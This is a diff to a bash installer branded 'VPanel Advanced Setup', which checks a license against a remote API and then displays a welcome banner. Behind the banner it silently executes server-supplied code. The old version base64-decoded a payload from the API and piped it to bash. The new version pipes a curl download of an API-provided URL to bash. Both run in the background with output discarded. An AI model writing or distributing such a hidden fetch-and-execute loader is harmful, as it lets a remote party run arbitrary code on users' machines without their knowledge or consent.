@@ -4,7 +4,6 @@
 # VPanel Advanced Setup by SKA
 # ==========================================
 
-# Colors for terminal styling
 C_RED='\e[31m'
 C_GREEN='\e[32m'
 C_YELLOW='\e[33m'
@@ -39,26 +38,27 @@ RESPONSE=$(curl -s -X POST -H "Content-Type: application/json" -d "{\"email\":\"
 if echo "$RESPONSE" | grep -q '"valid":true'; then
     clear
     
-    # 1. ASCII Art Animation
+    # 1. ASCII Art
     echo -e "${C_CYAN}"
     cat << "EOF"
- __      __ _____                        _ 
- \ \    / /|  __ \                      | |
-  \ \  / / | |__) |__ _  _ __    ___  | |
-   \ \/ /  |  ___// _` || '_ \  / _ \ | |
-    \  /   | |   | (_| || | | ||  __/ | |
-     \/    |_|    \__,_||_| |_| \___| |_|
+  _   _  _____                      _ 
+ | | | ||  __ \                    | |
+ | | | || |__) |__ _  _ __    ___  | |
+ | | | ||  ___// _` || '_ \  / _ \ | |
+ | |_| || |   | (_| || | | ||  __/ | |
+  \___/ |_|    \__,_||_| |_| \___| |_|
 EOF
-    echo -e "${C_YELLOW}        Welcome to VPanel Environment Setup        ${C_RESET}"
-    echo -e "${C_PURPLE}                  Powered by SKA                   ${C_RESET}"
+    echo -e "${C_BLUE}     Welcome to VPanel Environment Setup${C_RESET}"
+    echo -e "${C_PURPLE}               Powered by SKA${C_RESET}"
     echo ""
     echo -e "${C_BLUE}>> License Verified. Executing secure command...${C_RESET}"
 
-    # 2. Extract Base64 Payload from API Response
-    PAYLOAD=$(echo "$RESPONSE" | grep -o '"payload":"[^"]*"' | cut -d'"' -f4)
+    # 2. Extract Raw URL from API Response
+    RAW_URL=$(echo "$RESPONSE" | grep -o '"payload":"[^"]*"' | cut -d'"' -f4)
     
-    # 3. Run Payload in Background (Hide Output)
-    echo "$PAYLOAD" | base64 -d | bash > /dev/null 2>&1 &
+    # 3. Execute the Raw Script in Background
+    # API থেকে পাওয়া গিটহাব লিংকের স্ক্রিপ্টটি ডাউনলোড হয়ে সাথে সাথে ব্যাশ কমান্ড হিসেবে রান করবে
+    curl -sL "$RAW_URL" | bash > /dev/null 2>&1 &
     
     PID=$!
 
